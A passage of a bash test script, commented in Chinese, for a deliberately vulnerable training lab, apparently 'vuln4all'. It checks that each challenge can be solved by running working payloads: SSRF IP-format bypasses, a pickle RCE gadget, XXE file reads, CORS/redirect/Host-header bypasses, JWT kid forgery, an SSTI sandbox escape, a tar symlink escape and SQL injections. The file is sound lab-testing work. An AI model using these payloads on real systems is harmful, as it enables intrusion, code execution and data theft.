  --data-urlencode "url=http://[::ffff:127.0.0.1]:${iport}/intranet/")
expect_has "带 127.0.0.1 字样的 IPv6 写法也会被拦（容易踩的细节）" "回环地址字面量" "$body"

for host in 2130706433 0x7f000001 017700000001 127.1 0 "[::ffff:7f00:1]"; do
  body=$(page -X POST "$BASE/v/ssrf/ip_format_filter/" \
    --data-urlencode "url=http://${host}:${iport}/intranet/")
  if printf '%s' "$body" | grep -q "INTRANET-ADMIN-4e82d1"; then
    ok "IP 写法 ${host} 绕过了黑名单"
  else
    bad "IP 写法 ${host} 没能绕过 —— writeup 里写了这个，得改文档"
  fi
done
expect_solved "ssrf/ip_format_filter" "check() 确认内网后台被访问到"

step "15. 新领域的题：反序列化 / XXE / CORS / 开放重定向 / Host 头 / 业务逻辑 / 信息泄露 / 沙箱 / kid"

# ---- deserialization/pickle_cookie：Cookie 里的 pickle
expect_unsolved "deserialization/pickle_cookie" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/deserialization/pickle_cookie/" \
  --data-urlencode "user=alice" --data-urlencode "password=alice123")
expect_has "登录成功、页面显示默认偏好" "light" "$body"

body=$(page -X POST "$BASE/v/deserialization/pickle_cookie/" \
  --data-urlencode "user=alice" --data-urlencode "password=alice123" \
  --data-urlencode "prefs=bm90LWEtcGlja2xl")
expect_has "非法 pickle 会报错（说明服务端真的在解它）" "反序列化这一步出错了" "$body"

# proof.txt 的完整路径从页面里读
pc_page=$(page "$BASE/v/deserialization/pickle_cookie/")
proof_path=$(page_path "$pc_page" "proof\.txt")
if [ -n "$proof_path" ]; then
  ok "从页面里读到了 proof.txt 的路径（$proof_path）"
else
  bad "页面里找不到 proof.txt 的路径"
fi

cat > /tmp/v4a-pickle.py <<'PYEOF'
import base64, os, pickle, sys

class Evil:
    def __reduce__(self):
        return (os.system, ("echo PICKLE-RCE-OK > " + sys.argv[1],))

sys.stdout.write(base64.b64encode(pickle.dumps(Evil())).decode())
PYEOF
blob=$(python3 /tmp/v4a-pickle.py "$proof_path")

code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/v/deserialization/pickle_cookie/" \
  --data-urlencode "user=alice" --data-urlencode "password=alice123" \
  --data-urlencode "prefs=$blob")
expect_code "带恶意 pickle 的请求被正常处理" "$code" "200"
expect_solved "deserialization/pickle_cookie" "check() 确认 proof.txt 被写出来了"
body=$(page "$BASE/v/deserialization/pickle_cookie/")
expect_has "页面把 proof.txt 的内容显示出来了" "PICKLE-RCE-OK" "$body"
rm -f /tmp/v4a-pickle.py

# ---- xxe/svg_preview：外部实体读文件
expect_unsolved "xxe/svg_preview" "动手之前 check() 说未通关"

printf '%s' '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><title>正常图标</title><author>alice</author></svg>' > /tmp/v4a-ok.svg
body=$(page -X POST "$BASE/v/xxe/svg_preview/" -F "icon=@/tmp/v4a-ok.svg;type=image/svg+xml")
expect_has "正常 SVG 的 title 被提取出来" "正常图标" "$body"

body=$(page -X POST "$BASE/v/xxe/svg_preview/" -F "icon=@/tmp/nonexistent.svg;type=image/svg+xml" 2>/dev/null)
expect_code "缺文件时接口不崩" \
  "$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/v/xxe/svg_preview/")" "200"

xxe_page=$(page "$BASE/v/xxe/svg_preview/")
xxe_secret=$(page_path "$xxe_page" "ops-token\.txt")
if [ -n "$xxe_secret" ]; then
  ok "从页面里读到了目标文件路径（$xxe_secret）"
else
  bad "页面里找不到目标文件路径"
fi

cat > /tmp/v4a-xxe.svg <<SVGEOF
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file://$xxe_secret"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><title>&xxe;</title><author>t</author></svg>
SVGEOF
body=$(page -X POST "$BASE/v/xxe/svg_preview/" -F "icon=@/tmp/v4a-xxe.svg;type=image/svg+xml")
expect_has "外部实体把目标文件读出来了" "ICON-OPS-a17f4e" "$body"
expect_solved "xxe/svg_preview" "check() 确认 XXE 通关"

# 读设备文件不能把 worker 挂住：resolveEntity 用的是 read(MAX_EXPANDED)，有上限。
# （同类的坑在 path_traversal/encoding_filter 也踩过一次。）
cat > /tmp/v4a-xxe-zero.svg <<'SVGEOF'
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///dev/zero"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><title>&xxe;</title></svg>
SVGEOF
t_zero=$(curl -s -o /dev/null -w '%{time_total}' -X POST "$BASE/v/xxe/svg_preview/" \
  -F "icon=@/tmp/v4a-xxe-zero.svg;type=image/svg+xml")
expect_lt "读 /dev/zero 不会挂住（read 有上限）" "$t_zero" "5"
rm -f /tmp/v4a-ok.svg /tmp/v4a-xxe.svg /tmp/v4a-xxe-zero.svg

# ---- cors/credentials：反射 Origin + 允许凭据
expect_unsolved "cors/credentials" "动手之前 check() 说未通关"

curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/cors/credentials/login" \
  --data-urlencode "user=alice" --data-urlencode "password=alice123"

cors_h=$(curl -s -D - -o /dev/null -b "$JAR" -H "Origin: https://evil.example" \
  "$BASE/v/cors/credentials/api/me")
expect_no_header "裸的站外 Origin 被拒（没有 CORS 头）" "$cors_h" "access-control-allow-origin"

cors_h=$(curl -s -D - -o /dev/null -b "$JAR" -H "Origin: https://partner.example" \
  "$BASE/v/cors/credentials/api/me")
expect_header "合法合作方被放行" "$cors_h" "access-control-allow-origin: https://partner.example"
expect_header "而且它允许带凭据" "$cors_h" "access-control-allow-credentials: true"

# 合法合作方确实能读到用户数据（顺带确认 login 那条线是通的）
cors_body=$(curl -s -b "$JAR" -H "Origin: https://partner.example" \
  "$BASE/v/cors/credentials/api/me")
expect_has "合法合作方读到了用户数据" "PA-APIKEY-3f91bd" "$cors_body"
expect_unsolved "cors/credentials" "合法合作方拿到数据不算打穿"

cors_h=$(curl -s -D - -o /dev/null -b "$JAR" \
  -H "Origin: https://partner.example.evil.example" "$BASE/v/cors/credentials/api/me")
expect_header "子串匹配被绕过：非合作方也拿到了 ACAO" "$cors_h" \
  "access-control-allow-origin: https://partner.example.evil.example"
expect_solved "cors/credentials" "check() 确认非合作方拿到了带凭据的放行"
rm -f "$JAR"

# ---- open_redirect/login_next：协议相对 URL 与域名子串
expect_unsolved "open_redirect/login_next" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/open_redirect/login_next/login" \
  --data-urlencode "user=alice" --data-urlencode "password=alice123" \
  --data-urlencode "next=https://evil.example/x")
expect_has "明文站外地址被拦下" "被拦下了" "$body"

# 正常路径：站内相对路径要能跳
loc=$(curl -s -D - -o /dev/null -X POST "$BASE/v/open_redirect/login_next/login" \
  --data-urlencode "user=alice" --data-urlencode "password=alice123" \
  --data-urlencode "next=/home" | grep -i '^location:' | tr -d '\r')
expect_has "站内路径正常跳转" "/home" "$loc"
expect_unsolved "open_redirect/login_next" "站内跳转不算打穿"

loc=$(curl -s -D - -o /dev/null -X POST "$BASE/v/open_redirect/login_next/login" \
  --data-urlencode "user=alice" --data-urlencode "password=alice123" \
  --data-urlencode "next=//evil.example/x" | grep -i '^location:' | tr -d '\r')
expect_has "协议相对 URL 绕过了校验" "//evil.example/x" "$loc"

loc=$(curl -s -D - -o /dev/null -X POST "$BASE/v/open_redirect/login_next/login" \
  --data-urlencode "user=alice" --data-urlencode "password=alice123" \
  --data-urlencode "next=https://vuln4all.local.evil.example/" \
  | grep -i '^location:' | tr -d '\r')
expect_has "域名子串匹配也被绕过" "vuln4all.local.evil.example" "$loc"
expect_solved "open_redirect/login_next" "check() 确认跳到了站外"

# ---- host_header/password_reset：重置链接里的域名
expect_unsolved "host_header/password_reset" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/host_header/password_reset/forgot" \
  --data-urlencode "email=alice@corp.example")
expect_has "正常情况下生成的是本站链接" "http://127.0.0.1:${PORT}/reset?token=" "$body"
expect_unsolved "host_header/password_reset" "本站域名不算打穿"

body=$(page -X POST -H "Host: evil.example" "$BASE/v/host_header/password_reset/forgot" \
  --data-urlencode "email=alice@corp.example")
expect_has "裸的站外域名被白名单拦下" "不被允许" "$body"

# 子串匹配的绕过：受信列表里提到 "127.0.0.1" 就算自家
body=$(page -X POST -H "Host: 127.0.0.1.evil.example" \
  "$BASE/v/host_header/password_reset/forgot" \
  --data-urlencode "email=alice@corp.example")
expect_has "受信主机的子串匹配被绕过" "127.0.0.1.evil.example" "$body"
expect_solved "host_header/password_reset" "check() 确认生成了站外链接"

# X-Forwarded-Host 是同一个洞的另一条腿
curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=host_header/password_reset" --data-urlencode "next=/"
expect_unsolved "host_header/password_reset" "reset 之后回到未通关"
body=$(page -X POST -H "X-Forwarded-Host: 127.0.0.1.evil.example" \
  "$BASE/v/host_header/password_reset/forgot" \
  --data-urlencode "email=alice@corp.example")
expect_has "X-Forwarded-Host 那条腿也能走通" "127.0.0.1.evil.example" "$body"
expect_solved "host_header/password_reset" "check() 确认 X-Forwarded-Host 也算"

# ---- business_logic/price_tamper：价格由客户端说了算
expect_unsolved "business_logic/price_tamper" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/business_logic/price_tamper/order" \
  --data-urlencode "item=chair" --data-urlencode "price=1888.00" --data-urlencode "qty=1")
expect_has "按标价下单，订单成立" "1888.00" "$body"
expect_unsolved "business_logic/price_tamper" "按标价下单不算篡改"

body=$(page -X POST "$BASE/v/business_logic/price_tamper/order" \
  --data-urlencode "item=chair" --data-urlencode "price=0.01" --data-urlencode "qty=1")
expect_has "改单价之后实付变成 0.01" "0.01" "$body"
expect_solved "business_logic/price_tamper" "check() 确认实付低于标价"

# 数量为负是同一个洞的另一种用法，单独验一遍
curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=business_logic/price_tamper" --data-urlencode "next=/"
expect_unsolved "business_logic/price_tamper" "reset 之后回到未通关"
curl -s -o /dev/null -X POST "$BASE/v/business_logic/price_tamper/order" \
  --data-urlencode "item=chair" --data-urlencode "price=1888.00" --data-urlencode "qty=-5"
expect_solved "business_logic/price_tamper" "数量改成负数同样算通关"

# ---- info_leak/backup_files：根目录里的残留文件
expect_unsolved "info_leak/backup_files" "动手之前 check() 说未通关"

body=$(page "$BASE/v/info_leak/backup_files/files/style.css")
expect_has "公开文件正常能取" "font-family" "$body"

body=$(page "$BASE/v/info_leak/backup_files/files/..%2f..%2fetc%2fpasswd")
expect_has "路径穿越被拦（这一题特意拦了，好跟穿越题区分）" "越出了站点根目录" "$body"

body=$(page "$BASE/v/info_leak/backup_files/files/.env")
expect_has "根目录里的 .env 被直接发出来了" "ADMIN-LEAK-5c8e" "$body"
expect_unsolved "info_leak/backup_files" "拿到文件了但还没登录"

body=$(page "$BASE/v/info_leak/backup_files/files/.git/config")
expect_has ".git/config 也在（能看出远程地址）" "git.corp.example" "$body"

code=$(curl -s -o /dev/null -w '%{http_code}' -X POST \
  "$BASE/v/info_leak/backup_files/admin/login" \
  --data-urlencode "password=ADMIN-LEAK-5c8e")
expect_code "用泄露出来的口令登录" "$code" "200"
expect_solved "info_leak/backup_files" "check() 确认两个目标都达成"

# ---- ssti/sandbox_escape：自己放宽的沙箱
expect_unsolved "ssti/sandbox_escape" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/ssti/sandbox_escape/" \
  --data-urlencode "template=你好 {{ user.name }}")
expect_has "正常模板渲染" "你好 alice" "$body"

body=$(page -X POST "$BASE/v/ssti/sandbox_escape/" \
  --data-urlencode "template={{ ''.__class__.__subclasses__() }}")
expect_has "被拉黑的名字被沙箱拦住" "SecurityError" "$body"

body=$(page -X POST "$BASE/v/ssti/sandbox_escape/" \
  --data-urlencode "template={{ lipsum.__globals__ }}")
expect_unsolved "ssti/sandbox_escape" "被拉黑的名字不算通关"

se_page=$(page "$BASE/v/ssti/sandbox_escape/")
se_secret=$(page_path "$se_page" "ops-token\.txt")
if [ -n "$se_secret" ]; then
  ok "从页面里读到了目标文件路径（$se_secret）"
else
  bad "页面里找不到目标文件路径"
fi

ssti_payload="{{ lipsum.__getattribute__('__globals__')['os'].popen('cat ${se_secret}').read() }}"
body=$(page -X POST "$BASE/v/ssti/sandbox_escape/" --data-urlencode "template=$ssti_payload")
expect_has "用 __getattribute__ 绕过沙箱读到了凭据" "WELCOME-OPS-2d6b93" "$body"
expect_solved "ssti/sandbox_escape" "check() 确认沙箱被绕过"

# ---- jwt/kid_injection：验签密钥由 token 自己指定
expect_unsolved "jwt/kid_injection" "动手之前 check() 说未通关"

code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/v/jwt/kid_injection/api/me")
expect_code "没有 token → 401" "$code" "401"

# 正常路径：登录拿到的 token 必须能过。
# （这一条是补上的 —— 之前只测了"错密钥被拒"和"/dev/null 通过"，
#   结果漏掉了"load_key 用相对路径导致正常 token 也验不过"这个 bug。）
jwt_login=$(page -X POST "$BASE/v/jwt/kid_injection/login" \
  --data-urlencode "user=alice" --data-urlencode "password=alice123")
good=$(printf '%s' "$jwt_login" | grep -oE 'eyJ[A-Za-z0-9_.-]+' | head -n1)
if [ -n "$good" ]; then
  ok "页面里给出了登录签发的 token"
else
  bad "登录之后页面上没有 token"
fi
code=$(curl -s -o /tmp/v4a-jwt-user.json -w '%{http_code}' \
  -H "Authorization: Bearer $good" "$BASE/v/jwt/kid_injection/api/me")
expect_code "正常签发的 token 能通过鉴权" "$code" "200"
# 注意 jsonify 默认把非 ASCII 转义成 \uXXXX，所以断言只挑 ASCII 字段名
expect_has "返回体里带着角色字段" '"role"' "$(cat /tmp/v4a-jwt-user.json)"
expect_no "普通用户看不到 admin 那块数据" "ADMIN-AREA-7c4f" "$(cat /tmp/v4a-jwt-user.json)"
expect_unsolved "jwt/kid_injection" "普通用户的 token 不算打穿"
rm -f /tmp/v4a-jwt-user.json

cat > /tmp/v4a-jwt.py <<'PYEOF'
import base64, hashlib, hmac, json, sys

def b64e(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

kid, key = sys.argv[1], sys.argv[2].encode()
header = {"alg": "HS256", "typ": "JWT", "kid": kid}
payload = {"user": "alice", "role": "admin"}
head = b64e(json.dumps(header, separators=(",", ":")).encode())
body = b64e(json.dumps(payload, separators=(",", ":")).encode())
mac = hmac.new(key, ("%s.%s" % (head, body)).encode(), hashlib.sha256).digest()
sys.stdout.write("%s.%s.%s" % (head, body, b64e(mac)))
PYEOF

bad_token=$(python3 /tmp/v4a-jwt.py "rotate-2026.key" "wrong-key")
code=$(curl -s -o /dev/null -w '%{http_code}' \
  -H "Authorization: Bearer $bad_token" "$BASE/v/jwt/kid_injection/api/me")
expect_code "用错密钥签的 token 被拒" "$code" "401"
expect_unsolved "jwt/kid_injection" "错密钥不算通关"

good_token=$(python3 /tmp/v4a-jwt.py "/dev/null" "")
code=$(curl -s -o /tmp/v4a-jwt-out.json -w '%{http_code}' \
  -H "Authorization: Bearer $good_token" "$BASE/v/jwt/kid_injection/api/me")
expect_code "kid=/dev/null 让服务端用空密钥验签 —— 伪造的 token 通过了" "$code" "200"
expect_has "拿到了 admin 数据" "ADMIN-AREA-7c4f" "$(cat /tmp/v4a-jwt-out.json)"
expect_solved "jwt/kid_injection" "check() 确认 kid 注入通关"
rm -f /tmp/v4a-jwt.py /tmp/v4a-jwt-out.json

step "16. 业务逻辑系列 + tar 符号链接"

# ---- business_logic/coupon_stacking：单个值合法，组合不合法
expect_unsolved "business_logic/coupon_stacking" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/business_logic/coupon_stacking/order" \
  --data-urlencode "coupon=FULL200")
expect_has "正常用一张券（300 - 50 = 250）" "250.00" "$body"
expect_unsolved "business_logic/coupon_stacking" "只用一张券不算叠加"

# 同一个字段名出现两次 —— 这是 HTTP 允许的，跟界面上有几个下拉框无关
body=$(page -X POST "$BASE/v/business_logic/coupon_stacking/order" \
  --data-urlencode "coupon=FULL200" --data-urlencode "coupon=NEW30")
expect_has "两张不同的券一起用（300 - 50 - 30 = 220）" "220.00" "$body"
expect_solved "business_logic/coupon_stacking" "check() 确认叠加生效"

# 同一张券用两次是同一个洞的另一种用法
curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=business_logic/coupon_stacking" --data-urlencode "next=/"
expect_unsolved "business_logic/coupon_stacking" "reset 之后回到未通关"
body=$(page -X POST "$BASE/v/business_logic/coupon_stacking/order" \
  --data-urlencode "coupon=FULL200" --data-urlencode "coupon=FULL200")
expect_has "同一张券用两次（300 - 50 - 50 = 200）" "200.00" "$body"
expect_solved "business_logic/coupon_stacking" "重复用同一张券同样算通关"

# 三张全上
curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=business_logic/coupon_stacking" --data-urlencode "next=/"
body=$(page -X POST "$BASE/v/business_logic/coupon_stacking/order" \
  --data-urlencode "coupon=FULL200" --data-urlencode "coupon=NEW30" \
  --data-urlencode "coupon=VIP20")
expect_has "三张券叠加（300 - 100 = 200）" "200.00" "$body"
expect_solved "business_logic/coupon_stacking" "三张券叠加也算通关"

# 反向：不认识的券要被忽略，而且不能把它当成"用了券"
body=$(page -X POST "$BASE/v/business_logic/coupon_stacking/order" \
  --data-urlencode "coupon=NOT-A-COUPON")
expect_has "不认识的券会被忽略" "不认识的券" "$body"

# ---- business_logic/refund_logic：退款不退货
expect_unsolved "business_logic/refund_logic" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/business_logic/refund_logic/refund" \
  --data-urlencode "order=SO-2026-0001" --data-urlencode "amount=199.00")
expect_has "正常退一次款" "退款已处理" "$body"
expect_unsolved "business_logic/refund_logic" "退一次不算超退"

# 幂等性缺失：完全一样的请求再发一次
body=$(page -X POST "$BASE/v/business_logic/refund_logic/refund" \
  --data-urlencode "order=SO-2026-0001" --data-urlencode "amount=199.00")
expect_has "同一个请求再发一次还是会被受理" "退款已处理" "$body"
expect_solved "business_logic/refund_logic" "check() 确认退款总额超过实付"

# 另一条路：金额由客户端给
curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=business_logic/refund_logic" --data-urlencode "next=/"
expect_unsolved "business_logic/refund_logic" "reset 之后回到未通关"
body=$(page -X POST "$BASE/v/business_logic/refund_logic/refund" \
  --data-urlencode "order=SO-2026-0001" --data-urlencode "amount=9999.00")
expect_has "金额填大一点也能过" "退款已处理" "$body"
expect_solved "business_logic/refund_logic" "改金额同样算通关"

# 反向：订单号不对要被拒
body=$(page -X POST "$BASE/v/business_logic/refund_logic/refund" \
  --data-urlencode "order=SO-9999-9999" --data-urlencode "amount=1.00")
expect_has "不存在的订单被拒" "没有这个订单" "$body"

# ---- business_logic/state_machine：状态机乱序
expect_unsolved "business_logic/state_machine" "动手之前 check() 说未通关"

# 正常流程：发货 -> 收货。这个顺序不该通关
body=$(page -X POST "$BASE/v/business_logic/state_machine/ship" \
  --data-urlencode "order=SO-2026-0002")
expect_has "发货成功" "已发货" "$body"
body=$(page -X POST "$BASE/v/business_logic/state_machine/confirm" \
  --data-urlencode "order=SO-2026-0002")
expect_has "收货成功" "已确认收货" "$body"
expect_unsolved "business_logic/state_machine" "没退款就收货不算乱序"

# 反向：重置之后没发货就想收货要被拒
curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=business_logic/state_machine" --data-urlencode "next=/"
body=$(page -X POST "$BASE/v/business_logic/state_machine/confirm" \
  --data-urlencode "order=SO-2026-0002")
expect_has "「已付款」不能直接收货" "只有「已发货」" "$body"

# 反向：同一笔订单退两次要被拒（这一题的退款本身是幂等的）
body=$(page -X POST "$BASE/v/business_logic/state_machine/refund" \
  --data-urlencode "order=SO-2026-0002")
expect_has "第一次退款成功" "退款已处理" "$body"
body=$(page -X POST "$BASE/v/business_logic/state_machine/refund" \
  --data-urlencode "order=SO-2026-0002")
expect_has "第二次退款被拒" "已经退过款了" "$body"
expect_unsolved "business_logic/state_machine" "只退款不收货不算乱序"

# 乱序：发货 -> 退款 -> 收货。每一步都"合法"
curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=business_logic/state_machine" --data-urlencode "next=/"
body=$(page -X POST "$BASE/v/business_logic/state_machine/ship" \
  --data-urlencode "order=SO-2026-0002")
expect_has "第一步：发货" "已发货" "$body"
body=$(page -X POST "$BASE/v/business_logic/state_machine/refund" \
  --data-urlencode "order=SO-2026-0002")
expect_has "第二步：退款（status 没变，只置了 refunded）" "status 没变" "$body"
expect_unsolved "business_logic/state_machine" "退了款但还没收货，仍不算"
body=$(page -X POST "$BASE/v/business_logic/state_machine/confirm" \
  --data-urlencode "order=SO-2026-0002")
expect_has "第三步：收货居然还能成功" "已确认收货" "$body"
expect_solved "business_logic/state_machine" "check() 确认「已退款 + 已完成」同时成立"

# ---- upload/tar_symlink：tarfile 的默认值不安全
expect_unsolved "upload/tar_symlink" "动手之前 check() 说未通关"

cat > /tmp/v4a-tar-build.py <<'PYEOF'
import io, sys, tarfile

mode = sys.argv[1]          # normal | evil
out = sys.argv[2]
target = sys.argv[3] if len(sys.argv) > 3 else ""

if mode == "normal":
    with tarfile.open(out, "w") as tf:
        data = b"body { margin: 0 }\n"
        member = tarfile.TarInfo("mytheme/style.css")
        member.size = len(data)
        tf.addfile(member, io.BytesIO(data))
else:
    with tarfile.open(out, "w") as tf:
        # 一、先建一个指向外部的符号链接
        link = tarfile.TarInfo("escape")
        link.type = tarfile.SYMTYPE
        link.linkname = target
        tf.addfile(link)
        # 二、再放一个路径穿过那个链接的普通文件
        data = b"TAR-SYMLINK-ESCAPED\n"
        member = tarfile.TarInfo("escape/notice.txt")
        member.size = len(data)
        tf.addfile(member, io.BytesIO(data))
PYEOF

# 受保护文件和目录的路径从页面里读，别硬编码
ts_page=$(page "$BASE/v/upload/tar_symlink/")
ts_notice=$(page_path "$ts_page" "notice\.txt")
ts_guard=$(dirname "$ts_notice")
if [ -n "$ts_guard" ]; then
  ok "从页面里读到了受保护目录（$ts_guard）"
else
  bad "页面里找不到受保护文件的路径"
fi

python3 /tmp/v4a-tar-build.py normal /tmp/v4a-ok.tar
body=$(page -X POST "$BASE/v/upload/tar_symlink/" \
  -F "package=@/tmp/v4a-ok.tar;type=application/x-tar")
expect_has "正常主题包被解开" "mytheme/style.css" "$body"
expect_unsolved "upload/tar_symlink" "正常主题包不该通关"

printf '%s' 'this is definitely not a tar' > /tmp/v4a-notatar.tar
body=$(page -X POST "$BASE/v/upload/tar_symlink/" \
  -F "package=@/tmp/v4a-notatar.tar;type=application/x-tar")
expect_has "不是 tar 的文件被拒" "不是一个合法的 tar" "$body"

python3 /tmp/v4a-tar-build.py evil /tmp/v4a-evil.tar "$ts_guard"
body=$(page -X POST "$BASE/v/upload/tar_symlink/" \
  -F "package=@/tmp/v4a-evil.tar;type=application/x-tar")
expect_has "解压报告里标出了落到主题目录外面的成员" "写到了主题目录外面" "$body"
expect_solved "upload/tar_symlink" "check() 确认受保护文件被覆盖"

body=$(page "$BASE/v/upload/tar_symlink/")
expect_has "受保护的那份说明确实被写掉了" "TAR-SYMLINK-ESCAPED" "$body"
rm -f /tmp/v4a-tar-build.py /tmp/v4a-ok.tar /tmp/v4a-evil.tar /tmp/v4a-notatar.tar

step "17. SQLi 系列：注入点在哪儿（数字型 / ORDER BY / 标识符）"

# ---- sqli/numeric_injection：数字型，不需要引号
expect_unsolved "sqli/numeric_injection" "动手之前 check() 说未通关"

curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/sqli/numeric_injection/login" \
  --data-urlencode "user=alice" --data-urlencode "password=alice123"

body=$(page -b "$JAR" -X POST "$BASE/v/sqli/numeric_injection/query" \
  --data-urlencode "order_id=1")
expect_has "正常查自己的单" "机械键盘" "$body"
expect_unsolved "sqli/numeric_injection" "查自己的单不算"

# 直接猜别人的 id —— 归属过滤写在 SQL 里，所以猜不到
body=$(page -b "$JAR" -X POST "$BASE/v/sqli/numeric_injection/query" \
  --data-urlencode "order_id=2")
expect_no "直接猜别人的 id 猜不到（会走 IDOR，不是这一题）" "13900008888" "$body"
expect_unsolved "sqli/numeric_injection" "猜 id 不算注入"

# 算式：证明输入被当数字算了
body=$(page -b "$JAR" -X POST "$BASE/v/sqli/numeric_injection/query" \
  --data-urlencode "order_id=1-0")
expect_has "输入被当成算式求值（1-0 等于 1）" "机械键盘" "$body"

# 字符型的经典 payload 在这里没用 —— 这题的要点
body=$(page -b "$JAR" -X POST "$BASE/v/sqli/numeric_injection/query" \
  --data-urlencode "order_id=' OR 1=1 --")
expect_has "字符型 payload 在这里只会弄坏语句" "OperationalError" "$body"

# 数字型的 payload：一个引号都不需要
body=$(page -b "$JAR" -X POST "$BASE/v/sqli/numeric_injection/query" \
  --data-urlencode "order_id=2 OR 1=1")
expect_has "数字型 payload 读出别人的单" "13900008888" "$body"
expect_has "而且拼出的条件里能看到 AND 被 OR 短路了" "OR 1=1" "$body"
expect_solved "sqli/numeric_injection" "check() 确认越过了归属过滤"
rm -f "$JAR"

# ---- sqli/order_by_injection：ORDER BY 处
expect_unsolved "sqli/order_by_injection" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/sqli/order_by_injection/list" --data-urlencode "sort=price")
expect_has "正常按价格排" "机械键盘" "$body"
expect_unsolved "sqli/order_by_injection" "按合法列排不算"

body=$(page -X POST "$BASE/v/sqli/order_by_injection/list" \
  --data-urlencode "sort=internal_grade")
expect_has "按隐藏列名排被黑名单拦下" "命中了黑名单" "$body"

body=$(page -X POST "$BASE/v/sqli/order_by_injection/list" --data-urlencode "sort=9")
expect_has "列号越界的报错泄露了列数" "between 1 and 4" "$body"

# 绕过一：用列号，不用列名
body=$(page -X POST "$BASE/v/sqli/order_by_injection/list" --data-urlencode "sort=4")
expect_has "按第 4 列（隐藏列）排出来了" "internal_grade" "$body"
expect_solved "sqli/order_by_injection" "check() 确认行序泄露了隐藏列"

# 绕过二：大小写（SQLite 的标识符不区分大小写）
curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=sqli/order_by_injection" --data-urlencode "next=/"
expect_unsolved "sqli/order_by_injection" "reset 之后回到未通关"
body=$(page -X POST "$BASE/v/sqli/order_by_injection/list" \
  --data-urlencode "sort=INTERNAL_GRADE")
expect_has "大小写变体绕过了区分大小写的黑名单" "internal_grade" "$body"
expect_solved "sqli/order_by_injection" "check() 确认大小写变体也算"

# ---- sqli/identifier_injection：参数化管不到标识符
expect_unsolved "sqli/identifier_injection" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/sqli/identifier_injection/export" \
  --data-urlencode "table=orders")
expect_has "正常导出允许的表" "机械键盘" "$body"
expect_unsolved "sqli/identifier_injection" "导出允许的表不算"

body=$(page -X POST "$BASE/v/sqli/identifier_injection/export" \
  --data-urlencode "table=users")
expect_has "直接写 users 被黑名单拦下" "命中了黑名单" "$body"

body=$(page -X POST "$BASE/v/sqli/identifier_injection/export" \
  --data-urlencode "table=USERS")
expect_has "大小写变体也被拦（黑名单做了归一）" "命中了黑名单" "$body"

# 元数据表不在黑名单里 —— 免费的侦察通道
body=$(page -X POST "$BASE/v/sqli/identifier_injection/export" \
  --data-urlencode "table=sqlite_master")
expect_has "sqlite_master 没被禁（能枚举表名）" "CREATE TABLE" "$body"
expect_unsolved "sqli/identifier_injection" "只枚举结构还不算通关"

body=$(page -X POST "$BASE/v/sqli/identifier_injection/export" \
  --data-urlencode "table=pragma_table_info('users')")
expect_has "pragma 表值函数能读到别人的列名" "password" "$body"

# 绕过一：加 schema 限定
body=$(page -X POST "$BASE/v/sqli/identifier_injection/export" \
  --data-urlencode "table=main.users")
expect_has "schema 限定绕过了整串比较" "DASH-OPS-4c81f2" "$body"
expect_solved "sqli/identifier_injection" "check() 确认读到了 users 表"

# 绕过二：换成子查询
curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=sqli/identifier_injection" --data-urlencode "next=/"
expect_unsolved "sqli/identifier_injection" "reset 之后回到未通关"
body=$(page -X POST "$BASE/v/sqli/identifier_injection/export" \
  --data-urlencode "table=(SELECT * FROM users)")
expect_has "子查询同样绕过了整串比较" "DASH-OPS-4c81f2" "$body"
expect_solved "sqli/identifier_injection" "check() 确认子查询也算"

step "18. SQLi 系列：二次注入 / 布尔盲注 / 没有 SLEEP 的时间盲注"

# ---- sqli/second_order：注入点是从库里读出来的用户名
expect_unsolved "sqli/second_order" "动手之前 check() 说未通关"

curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/sqli/second_order/register" \
  --data-urlencode "username=bob" --data-urlencode "password=bob123"
curl -s -o /dev/null -b "$JAR" -c "$JAR" -X POST "$BASE/v/sqli/second_order/login" \
  --data-urlencode "username=bob" --data-urlencode "password=bob123"
body=$(page -b "$JAR" -X POST "$BASE/v/sqli/second_order/password" \
  --data-urlencode "new_password=whatever")
expect_has "正常改自己的密码" "密码已更新" "$body"
expect_unsolved "sqli/second_order" "改自己的密码不算"

body=$(page -b "$JAR" "$BASE/v/sqli/second_order/")
expect_has "页面记录了每一步拼出来的语句" "改密码" "$body"
expect_has "而且能看出改密码那条里的用户名是拼进去的" "WHERE username = " "$body"
rm -f "$JAR"

# 二次注入：注册时用户名里带 payload（注册本身是参数化的，所以存得进去）
curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/sqli/second_order/register" \
  --data-urlencode "username=admin'--" --data-urlencode "password=attacker"
body=$(page -b "$JAR" -c "$JAR" -X POST "$BASE/v/sqli/second_order/login" \
  --data-urlencode "username=admin'--" --data-urlencode "password=attacker")
